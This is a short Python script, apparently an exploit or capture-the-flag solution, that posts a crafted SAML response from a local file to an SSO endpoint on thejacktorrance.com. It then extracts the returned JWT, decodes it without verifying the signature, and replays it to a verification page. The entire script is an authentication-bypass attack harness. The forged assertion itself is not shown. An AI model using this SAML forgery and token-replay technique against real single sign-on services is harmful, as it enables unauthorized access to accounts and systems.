import requests
import base64
import gzip, zlib
import urllib
import jwt

data = open('ex.saml').read()
data = base64.b64encode(data)

res = requests.post('https://thejacktorrance.com/sso/acs', data = {
    'SAMLResponse': data
}, allow_redirects = False)

if not 'token=' in res.text: 
    print('[-] no token')
    print(res.text)
    exit()

begin = res.text.index('token=') + 6
token = res.text[begin:]

print(token)
print(repr(jwt.decode(token, verify=False)))

res = requests.get('https://thejacktorrance.com/verification?token={}'.format(urllib.quote(token)))
print(res.text)
